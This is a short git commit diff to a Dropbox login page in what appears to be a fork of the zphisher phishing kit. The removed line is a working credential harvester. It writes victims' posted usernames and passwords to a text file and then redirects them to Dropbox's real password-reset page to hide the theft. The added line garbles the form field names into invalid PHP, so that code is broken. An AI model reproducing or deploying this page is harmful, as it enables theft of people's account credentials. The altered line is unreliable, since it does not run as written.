e281d82c3efbaa729dfd780c131134bf7c902e5d
v12spretin <otaviolacerda577@gmail.com>
2024-12-13 06:21:50 -0300

    https://github.com/baylandogu/zphisher.git

--- .sites/dropbox/login.php
+++ .sites/dropbox/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Dropbox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Dropbox Username: " . $_POST[m.minyxz_] . " Pass: " . $_POST[ ? ] . "\n", FILE_APPEND);
 header('Location: https://www.dropbox.com/forgot/');
 exit();
 ?>
